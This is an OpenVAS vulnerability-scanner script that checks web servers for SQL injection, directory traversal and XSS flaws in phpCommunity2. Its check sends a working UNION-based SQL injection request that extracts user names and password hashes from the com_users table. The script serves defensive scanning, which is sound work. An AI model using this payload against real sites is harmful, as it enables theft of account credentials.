###############################################################################
# OpenVAS Vulnerability Test
# $Id: phpCommunity2_multiple_remote_input_validation.nasl 14330 2019-03-19 13:59:11Z asteins $
#
# phpCommunity2 Multiple Remote Input Validation Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################


if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100041");
  script_version("$Revision: 14330 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:59:11 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2009-03-13 06:42:27 +0100 (Fri, 13 Mar 2009)");
  script_cve_id("CVE-2009-4884", "CVE-2009-4885", "CVE-2009-4886");
  script_bugtraq_id(34056);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("phpCommunity2 Multiple Remote Input Validation Vulnerabilities");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"summary", value:"phpCommunity2 is prone to multiple input-validation vulnerabilities,
  including multiple directory-traversal issues and SQL-injection issues,
  and a cross-site scripting issue.

  Exploiting these issues could allow an attacker to view arbitrary
  local files within the context of the webserver, steal cookie-based
  authentication credentials, compromise the application, access or
  modify data, or exploit latent vulnerabilities in the underlying
  database.");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34056/");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)) exit(0);

foreach dir( make_list_unique( "/phpcom", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir, "/index.php?n=guest&c=0&m=search&s=forum&wert=-1%25%22%20UNION%20ALL%20SELECT%201,2,3,4,CONCAT(nick,%200x3a,%20pwd),6%20FROM%20com_users%23");

  if(http_vuln_check(port:port, url:url,pattern:"admin:[a-f0-9]{32}")) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );